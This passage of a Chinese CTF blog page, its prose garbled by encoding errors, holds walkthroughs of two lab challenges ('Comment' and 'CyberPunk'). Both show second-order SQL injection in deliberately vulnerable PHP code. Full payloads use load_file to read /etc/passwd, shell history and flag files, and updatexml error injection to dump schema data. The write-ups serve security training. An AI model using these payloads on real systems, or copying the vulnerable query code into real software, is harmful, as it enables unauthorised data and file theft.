class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç±»ä¼¼åˆšåšè¿‡çš„<strong>CyberPunk</strong>ï¼Œå¯¹è¾“å…¥åšäº†è½¬ä¹‰ï¼Œç„¶è€Œ<code>$category = mysql_fetch_array($result)[&#39;category&#39;];</code>å´ç›´æ¥æŠ“å–äº†ç»“æœï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p>
<h4><span id="äºŒæ¬¡æ³¨å…¥">äºŒæ¬¡æ³¨å…¥</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå³æ˜¯å…³é”®çš„æ³¨å…¥ç‚¹ï¼Œcontentä¼šå–å‡ºæœªè½¬ä¹‰çš„å•å¼•å·è¿›è¡Œé—­åˆ</p>
<p>å…³é”®æ˜¯å¦‚ä½•æ„é€ ï¼Œè¿™æ˜¯ååˆ†å…³é”®çš„</p>
<blockquote>
<p>æ³¨æ„ï¼šè¿™é‡Œçš„contentæ˜¯commendçš„contentï¼Œä¸æ˜¯å¸–å­çš„content</p>
</blockquote>
<p>è¿™é‡Œçš„sqlè¯­å¥æ˜¯å¤šè¡Œçš„ï¼Œæ³¨é‡Šéœ€è¦ç”¨å¤šè¡Œæ³¨é‡Šï¼š</p>
<p>ä»¤category=â€™,content=database(),/<em>ï¼Œåœ¨ç•™è¨€ä¸­è¾“å…¥\</em>/#ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;&#x27;,content=database(),/*&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;*/#&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·æ„é€ ï¼Œ<code>/**/</code>æ³¨é‡Šæ‰è·¨è¡Œ<code>&#39;</code>ï¼Œ#æ³¨é‡Šæ‰åé¢çš„å•å¼•å·ï¼Œcontentå°±ä¼šæˆåŠŸè¢«æˆ‘ä»¬åŠ«æŒï¼Œæˆ‘ä»¬åœ¨ç•™è¨€åè¯­å¥å°±ä¼šæˆåŠŸæ‰§è¡Œå®Œæˆæ³¨å…¥ã€‚</p>
<p>ä½†æ˜¯æ³¨åº“åæ—¶å‘ç°æ²¡æœ‰å›æ˜¾ï¼Œä¸€ç•ªå°è¯•â€¦â€¦æ”¾å¼ƒâ€¦â€¦</p>
<p>load_fileè¯»å–passwdï¼š</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/songxingzhu/p/6364700.html">https://www.cnblogs.com/songxingzhu/p/6364700.html</a></p>
</blockquote>
<img src="/images/ç½‘é¼æ¯-2018-Comment/image-20210424155009903.png" alt="image-20210424155009903" style="zoom:80%;">

<p>æœ€ä¸‹é¢æœ‰ä¸€ä¸ªwwwç”¨æˆ·ï¼Œç›®å½•ä¸º/home/wwwï¼Œé»˜è®¤shellä¸ºbin/bashï¼Œç”±æ­¤å¯ä»¥æŸ¥ä¸€ä¸‹è¯¥ç”¨æˆ·çš„shellå†å²ï¼š</p>
<h4><span id="bash_history">.bash_history</span></h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011479200/article/details/86501366">https://blog.csdn.net/u011479200/article/details/86501366</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/chinalinuxzend/article/details/1849419">å‘½ä»¤è®°å½•.bash_history</a></p>
<p>æŸ¥ä¸‹/home/www/ä¸‹çš„å‘½ä»¤ä½¿ç”¨å†å²ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/ </span><br><span class="line">unzip html.zip </span><br><span class="line">rm -f html.zip </span><br><span class="line">cp -r html /var/www/ </span><br><span class="line"><span class="built_in">cd</span> /var/www/html/ </span><br><span class="line">rm -f .DS_Store </span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>

<p>.DS_Storeä¼¼ä¹æ˜¯ä¸€ç§æ³„éœ²ï¼Œåœ¨ç½‘é¡µä¸Šçº¿å‰åˆ æ‰äº†ï¼Œä½†æ˜¯/tmp/htmlä¸­åº”è¯¥æ˜¯å­˜åœ¨çš„ï¼š</p>
<p>è¯»å–å‘ç°æ˜¯ä¹±ç ä¸”æ˜¾ç¤ºä¸å®Œæ•´ï¼Œç”¨hex()è¯»å–ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bud1</span><br><span class="line">strapIl	bootstrapIlocblobF(ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½comment.phpIlocblobï¿½(ï¿½ï¿½cssIlocblobR(ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½flag_8946e1ff1ee3e40f.phpIlocblobï¿½(ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½fontsIlocblobFï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½	index.phpIlocblobï¿½ï¿½ï¿½ï¿½jsIlocblobRï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½	login.phpIlocblobï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½	mysql.phpIlocblobFï¿½ï¿½ï¿½ï¿½ï¿½ï¿½vendorIlocblobï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½write_do.phpIlocblobRï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ @ï¿½ @ï¿½ @ï¿½ @E</span><br></pre></td></tr></table></figure>

<p>å‘ç°flag_8946e1ff1ee3e40f.phpï¼Œå¯ä»¥ç€æ‰‹è¯»flagäº†â€¦â€¦</p>
<p>æˆ‘å¯»æ€å“ªä¸ªç›®å½•ä¸‹çš„flagæ–‡ä»¶åº”è¯¥éƒ½ä¸€æ ·ï¼Œç»“æœä¸ä¸€æ ·ï¼Œå¿…é¡»è¯»/var/www/html/ä¸‹é¢çš„â€¦â€¦</p>
<p><code>category=&#39;,content=hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;)),/*</code></p>
<p>è·å¾—flagâ€¦â€¦</p>
<img src="/images/ç½‘é¼æ¯-2018-Comment/image-20210424160546854.png" alt="image-20210424160546854" style="zoom:50%;">

<p>â€¦â€¦tql</p>
</div><div class="index-category-tag">Â Â <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2021-04-23Â Â <a class="commentCountImg" href="/2021/04/23/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/#comment-container"><span class="display-none-class">/2021/04/23/CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk/</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="cc9dcf1aaabf204c01b8cb5ca36fcef9">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>5 åˆ†é’Ÿ Â <i class="fas fa-pencil-alt">Â </i>0.8Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/23/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/">CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk</a></h1><div class="content"><h3><span id="ciscn2019-ååŒ—èµ›åŒº-day1-web5cyberpunk">[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</span></h3><img src="/images/CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk/image-20210423174538565.png" alt="image-20210423174538565" style="zoom:40%;">

<p>æ‘¸ç´¢ä¸€ä¸‹ï¼Œæœ‰æ·»åŠ è®¢å•ï¼ŒæŸ¥æ‰¾è®¢å•ï¼Œåˆ é™¤è®¢å•ï¼Œç¡®è®¤è®¢å•ï¼Œæ›´æ”¹è®¢å•çš„åŠŸèƒ½ï¼š</p>
<p>indexã€confirmã€deleteã€searchã€changeã€config</p>
<p>indexé¡µé¢æœ‰æç¤ºï¼š?fileï¼Œç”¨php://è¯»å–ï¼š</p>
<p>index.phpï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]) ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,$file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--?file=?--&gt;</span><br></pre></td></tr></table></figure>

<p>å…¶ä»–é¡µé¢éƒ½æœ‰é’ˆå¯¹sqlçš„è¿‡æ»¤ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œaddress(åœ°å€)æ²¡æœ‰è¿‡æ»¤â€¦â€¦</p>
<p>åœ¨æ·»åŠ è®¢å•åŠŸèƒ½ä¸­ï¼ˆconfirm.phpï¼‰ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$re-&gt;bind_param(<span class="string">&quot;sss&quot;</span>, $user_name, $address, $phone);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>bind_paramï¼š</p>
<p>è¯¥å‡½æ•°ç»‘å®šäº† SQL çš„å‚æ•°ï¼Œä¸”å‘Šè¯‰æ•°æ®åº“å‚æ•°çš„å€¼ã€‚ â€œsssâ€ å‚æ•°åˆ—å¤„ç†å…¶ä½™å‚æ•°çš„æ•°æ®ç±»å‹ã€‚s å­—ç¬¦å‘Šè¯‰æ•°æ®åº“è¯¥å‚æ•°ä¸ºå­—ç¬¦ä¸²ã€‚</p>
<p>å‚æ•°æœ‰ä»¥ä¸‹å››ç§ç±»å‹:</p>
<p>i - integerï¼ˆæ•´å‹ï¼‰<br>d - doubleï¼ˆåŒç²¾åº¦æµ®ç‚¹å‹ï¼‰<br>s - stringï¼ˆå­—ç¬¦ä¸²ï¼‰<br>b - BLOBï¼ˆå¸ƒå°”å€¼ï¼‰</p>
</blockquote>
<p>è¿™ä¸ªå‡½æ•°çš„ä½¿ç”¨ç»‘å®šäº†å‚æ•°ä¸ºå­—ç¬¦ä¸²ï¼Œæœ‰æ•ˆé˜²æ­¢äº†sqlæ³¨å…¥â€¦â€¦</p>
<p>change.phpï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.$address.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.$row[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;è®¢å•ä¿®æ”¹æˆåŠŸ&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;æœªæ‰¾åˆ°è®¢å•!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å…¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$address = addslashes($_POST[&quot;address&quot;]);</code>å¯¹ä¿®æ”¹å€¼è¿›è¡Œäº†è½¬ä¹‰æ“ä½œâ€¦â€¦</p>
<p>ç”±äºæŠ¥é”™ä¿¡æ¯æ˜¯å¯ä»¥æ‰“å°å‡ºæ¥çš„ï¼Œæ˜¯ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼š</p>
<h3><span id="æŠ¥é”™æ³¨å…¥">æŠ¥é”™æ³¨å…¥</span></h3><p><a target="_blank" rel="noopener" href="https://blkstone.github.io/2017/11/09/updatexml-sqli/">https://blkstone.github.io/2017/11/09/updatexml-sqli/</a></p>
<p>åˆ©ç”¨updatexmlçš„ä¸­é—´ä¸åˆè¯­æ³•çš„å‚æ•°æŠ¥é”™å¸¦å‡ºæ•°æ®</p>
<p>è‡³äºäºŒæ¬¡æ³¨å…¥ï¼Œå¾ˆå¤šwpéƒ½æ²¡è§£é‡Šâ€¦â€¦æˆ‘çŒœæµ‹ä¸€æ³¢â€¦â€¦</p>
<p>åœ¨æ›´æ–°æ•°æ®æ—¶ï¼Œè™½ç„¶å¯¹ä¿®æ”¹å€¼è¿›è¡Œäº†è½¬ä¹‰æ“ä½œï¼Œä½†ä¸ä¼šå°†<code>\</code>å¸¦å…¥æ•°æ®åº“ï¼Œæ‹¿å‡ºæ—¶ä»æ˜¯<code>&#39;</code>ã€‚</p>
<p><code>$row = $fetch-&gt;fetch_assoc();</code>æŠ“å–çš„æ˜¯ä¸Šä¸€æ¬¡çš„æ•°æ®</p>
<p>â€œâ€˜, `old_address`=â€™â€.$row[â€˜addressâ€™]æ˜¯ä¸Šä¸€æ¬¡çš„addressï¼Œè¿™ä½¿å¾— <strong>â€˜</strong> ä¾ç„¶èµ·æ•ˆâ€¦â€¦</p>
<p>æˆ‘ä»¬å…ˆæ³¨å…¥æŠ¥é”™è¯­å¥ï¼Œå†åœ¨changeéšä¾¿æ›´æ”¹ä¸‹ï¼Œä¸Šæ¬¡æ³¨å…¥è¯­å¥ä¾¿å¼€å§‹å·¥ä½œï¼Œè·å¾—æŠ¥é”™å†…å®¹ï¼Œå¸¦å‡ºæ•°æ®ã€‚</p>
<p>æ„é€ è¯­å¥ä½¿ç¬¦åˆè¯­æ³•è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span><br><span class="line"></span><br><span class="line">address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),0x7e),1)#</span><br><span class="line"></span><br><span class="line">address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;0x75736572)),20,30),0x7e),1)#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æŸ¥äº†ä¸€å¤§æ³¢ä¸œè¥¿ï¼Œä¼¼ä¹æ²¡æœ‰flagâ€¦â€¦?</p>
<p>åŸé¢˜ç›®å¥½åƒå‘Šè¯‰äº†è¦è¯»æ ¹ç›®å½•çš„flag.txtâ€¦â€¦</p>
<p><code>address=1&#39; where user_id=updatexml(1,concat(0x7e,substr(load_file(&#39;/flag.txt&#39;),1,20),0x7e),1)#</code></p>
<img src="/images/CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk/image-20210423190458532.png" alt="image-20210423190458532" style="zoom:80%;">

<p><code>address=1&#39; where user_id=updatexml(1,concat(0x7e,substr(load_file(&#39;/flag.txt&#39;),20,60),0x7e),1)#</code></p>
<p>flag{db0fd1ea-0731-4</p>
<p>b94-ad41-e7e6192643eb}</p>
<p>å¾—åˆ°äº†flagâ€¦â€¦</p>
</div><div class="index-category-tag">Â Â <hr></div></article></div><!--!--><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/page/3/">ä¸Šä¸€é¡µ</a></div><div class="pagination-next"><a href="/page/5/">ä¸‹ä¸€é¡µ</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li><li><a class="pagination-link is-current" href="/page/4/">4</a></li><li><a class="pagination-link" href="/page/5/">5</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/page/12/">12</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><!--!--><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/header.jpg" alt="inanb"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">inanb</p><p class="is-size-6 is-block">é“é©¬å†°æ²³å…¥æ¢¦æ¥</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">æ–‡ç« </p><a href="/archives"><p class="title">119</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">åˆ†ç±»</p><a href="/categories"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">æ ‡ç­¾</p><a href="/tags"><p class="title">9</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/inanb" target="_blank" rel="noopener">å…³æ³¨æˆ‘</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/inanb"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D ä¸€è¨€å¥å­è·å–ä¸­...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"æ¥æºã€Š"+data.from+"ã€‹</p><p>æä¾›è€…-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">é“¾æ¥</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">æœ€æ–°æ–‡ç« </h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-09T14:59:16.144Z">2021-11-09</time></p><p class="title"><a href="/2021/11/09/%E5%AE%9E%E9%AA%8C--%E9%80%9A%E8%BF%87FTP_SSRF_%E6%94%BB%E5%87%BBPHP-FPM/"> </a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-09T00:45:03.161Z">2021-11-09</time></p><p class="title"><a href="/2021/11/09/%E5%AE%9E%E9%AA%8C--SSRF_PHP-FPM/"> </a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-08T13:48:42.267Z">2021-11-08</time></p><p class="title"><a href="/2021/11/08/%E5%AE%9E%E9%AA%8C--PHP-FPM_%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"> </a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-24T13:27:46.244Z">2021-09-24</time></p><p class="title"><a href="/2021/09/24/%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay_eval/"> </a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-21T08:18:19.243Z">2021-09-21</time></p><p class="title"><a href="/2021/09/21/SUCTF-2018-MultiSQL/">SUCTF-2018-MultiSQL</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">åˆ†ç±»</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/LeetCode/"><span class="level-start"><span class="level-item">LeetCode</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/WEB/"><span class="level-start"><span class="level-item">WEB</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/web/"><span class="level-start"><span class="level-item">web</span></span><span class="level-end"><span class="level-item tag">27</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"><span class="level-start"><span class="level-item">å­¦ä¹ æŠ¥å‘Š</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%AC%94%E8%AE%B0/"><span class="level-start"><span class="level-item">ç¬”è®°</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">å½’æ¡£</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2021/11/"><span class="level-start"><span class="level-item">åä¸€æœˆ 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/09/"><span class="level-start"><span class="level-item">ä¹æœˆ 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/08/"><span class="level-start"><span class="level-item">å…«æœˆ 2021</span></span><span class="level-end"><span class="level-item tag">14</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/05/"><span class="level-start"><span class="level-item">äº”æœˆ 2021</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/04/"><span class="level-start"><span class="level-item">å››æœˆ 2021</span></span><span class="level-end"><span class="level-item tag">20</span></span></a></li><a class="level is-mobile is-marginless" href="/archives/"><span class="level-start"><span class="level-item">æŸ¥çœ‹å…¨éƒ¨&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">æ ‡ç­¾</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/buuctf/"><span class="tag">buuctf</span><span class="tag is-grey-lightest">27</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf/"><span class="tag">Buuctf</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag 